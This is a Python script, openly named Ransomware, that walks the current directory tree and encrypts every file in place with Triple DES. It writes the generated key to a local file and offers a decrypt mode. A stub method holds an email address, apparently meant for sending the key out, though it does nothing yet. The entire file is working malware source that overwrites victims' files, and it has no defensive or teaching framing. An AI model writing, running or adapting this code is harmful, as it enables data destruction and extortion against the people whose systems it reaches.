import os
import base64
from Crypto.Cipher import DES3
from Crypto.Random import get_random_bytes

import argparse

class Ransomware:

    def __init__(self, key=None):
        self.key = key
        self.cryptor = None
        self.iv=b"init vec"

    def send_key():
        sender_email = "lrqzixfn@hi2.in"

    def generate_key(self):
        self.key = get_random_bytes(16)
        self.cryptor = DES3.new(self.key, DES3.MODE_CFB,self.iv)

    def read_key(self, keyfile_name):
        with open(keyfile_name, 'rb') as f:
            self.key = f.read()     
            self.cryptor = DES3.new(self.key, DES3.MODE_CFB,self.iv)


    def write_key(self, keyfile_name):
        print(f"Key:{self.key}")
        with open(keyfile_name, 'wb') as f:
            f.write(self.key)

    def crypt_root(self, root_dir, encrypted=False):
        for files in os.walk(root_dir):
            for f in files[2]:
                abs_file_path = os.path.join(files[0], f)
                if "keyfile.txt" in f or "temp.py" in f:
                    continue
                self.crypt_file(abs_file_path, encrypted=encrypted)



    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb+') as f:
            _data = f.read()
            if not encrypted:
                print(f'Encryption: {file_path}')
                data = self.cryptor.encrypt(_data)
            else:
                data = (self.cryptor.decrypt(_data))
                print(f'Decryption: {file_path}')
            f.seek(0)
            f.write(data)

if __name__ == '__main__':
    local_root = '.'

    parser = argparse.ArgumentParser()
    parser.add_argument('--action', required=True)
    parser.add_argument('--keyfile')

    args = parser.parse_args()
    action = args.action.lower()
    keyfile = args.keyfile

    main = Ransomware()

    if action == 'decrypt':
        if keyfile is None:
            print('Path to keyfile must be specified after --keyfile to perform decryption.')
        else:
            main.read_key(keyfile)
            main.crypt_root(local_root, encrypted=True)
    elif action == 'encrypt':
        
        main.generate_key()
        main.write_key('keyfile.txt')
        main.crypt_root(local_root)